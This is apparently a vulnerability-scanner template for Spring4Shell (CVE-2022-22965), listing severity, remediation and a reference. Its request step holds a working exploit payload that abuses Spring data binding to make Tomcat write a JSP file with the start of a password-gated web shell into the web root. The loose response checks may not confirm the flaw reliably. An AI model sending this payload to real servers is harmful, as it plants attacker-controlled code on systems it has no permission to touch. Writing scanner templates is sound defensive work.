id: spring4shell
name: Spring4Shell RCE
severity: critical
cve: CVE-2022-22965
tags: [spring, rce, java, framework]
port: 8080
protocol: http
description: Spring Framework RCE via data binding with class parameter
remediation: Upgrade Spring Framework >= 5.3.18 / 5.2.20
reference: https://nvd.nist.gov/vuln/detail/CVE-2022-22965
steps:
  - type: send
    data: /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%0D%0A&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=lightscan_test&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
  - type: match
    status: [400, 422]
    part: body
  - type: match
    not_contains: "404"
